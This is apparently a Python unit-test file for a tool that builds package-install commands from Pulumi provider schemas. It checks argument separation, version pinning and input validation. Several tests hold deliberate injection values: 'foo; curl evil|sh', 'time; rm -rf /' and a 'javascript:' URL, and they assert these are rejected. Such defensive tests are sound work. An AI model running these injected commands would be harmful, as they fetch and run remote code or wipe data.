from __future__ import annotations

import sys
import unittest
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent))
import sdk_install_probe  # noqa: E402

SCHEMA: dict[str, Any] = {
    "name": "time",
    "pluginDownloadURL": "https://get.example.com/time",
    "language": {
        "nodejs": {"packageName": "@pulumiverse/time"},
        "python": {"packageName": "pulumiverse_time"},
        "go": {"importBasePath": "github.com/pulumiverse/pulumi-time/sdk/go/time"},
    },
}


class ProbeInstallsTests(unittest.TestCase):
    def setUp(self) -> None:
        self.calls: list[list[str]] = []
        self._original = sdk_install_probe._run

        def fake(cmd: list[str], cwd: str | None = None, env: dict[str, str] | None = None) -> tuple[bool, str]:
            self.calls.append(cmd)
            return True, ""

        sdk_install_probe._run = fake

    def tearDown(self) -> None:
        sdk_install_probe._run = self._original

    def _flat(self) -> list[str]:
        return [" ".join(c) for c in self.calls]

    def test_commands_built_from_schema_fields(self) -> None:
        results = sdk_install_probe.probe_installs("time", "v0.1.1", SCHEMA)
        commands = {r.language: r.command for r in results}
        self.assertEqual(commands["plugin"], "pulumi plugin install resource time v0.1.1")
        self.assertEqual(commands["nodejs"], "npm install @pulumiverse/time@0.1.1")
        self.assertEqual(commands["python"], "pip download pulumiverse_time==0.1.1")
        self.assertIn("go get github.com/pulumiverse/pulumi-time/sdk/go/time@v0.1.1", commands["go"])
        self.assertTrue(all(r.result == "pass" for r in results))

    def test_identifiers_passed_as_argv_after_separator(self) -> None:
        sdk_install_probe.probe_installs("time", "v0.1.1", SCHEMA)
        flat = self._flat()
        self.assertTrue(any("npm install" in c and "-- @pulumiverse/time@0.1.1" in c for c in flat))
        self.assertTrue(any("pip download" in c and "-- pulumiverse_time==0.1.1" in c for c in flat))
        self.assertTrue(any(c.startswith("pulumi plugin install resource time v0.1.1") for c in flat))
        self.assertTrue(any("--server https://get.example.com/time" in c for c in flat))

    def test_version_is_pinned_not_latest(self) -> None:
        sdk_install_probe.probe_installs("time", "v2.3.4", SCHEMA)
        for command in (" ".join(c) for c in self.calls):
            if any(word in command for word in ("get", "install", "download")):
                self.assertTrue("2.3.4" in command or "mod" in command or "init" in command)

    def test_bad_plugin_url_is_dropped(self) -> None:
        bad = {**SCHEMA, "pluginDownloadURL": "javascript:alert(1)"}
        sdk_install_probe.probe_installs("time", "v0.1.1", bad)
        self.assertFalse(any("--server" in c for c in self._flat()))

    def test_injection_in_name_is_rejected_and_never_executed(self) -> None:
        evil = {**SCHEMA, "language": {**SCHEMA["language"], "nodejs": {"packageName": "foo; curl evil|sh"}}}
        results = sdk_install_probe.probe_installs("time", "v0.1.1", evil)
        nodejs = next(r for r in results if r.language == "nodejs")
        self.assertEqual(nodejs.result, "rejected")
        self.assertFalse(any(c and c[0] == "npm" for c in self.calls))

    def test_injection_in_provider_name_rejects_plugin(self) -> None:
        results = sdk_install_probe.probe_installs("time; rm -rf /", "v0.1.1", SCHEMA)
        plugin = next(r for r in results if r.language == "plugin")
        self.assertEqual(plugin.result, "rejected")
        self.assertFalse(any(c and c[0] == "pulumi" for c in self.calls))

    def test_python_falls_back_to_pulumi_underscore_name(self) -> None:
        no_python = {"name": "thoth", "language": {"go": SCHEMA["language"]["go"]}}
        results = sdk_install_probe.probe_installs("thoth", "v1.0.0", no_python)
        python = next(r for r in results if r.language == "python")
        self.assertEqual(python.command, "pip download pulumi_thoth==1.0.0")


if __name__ == "__main__":
    unittest.main()
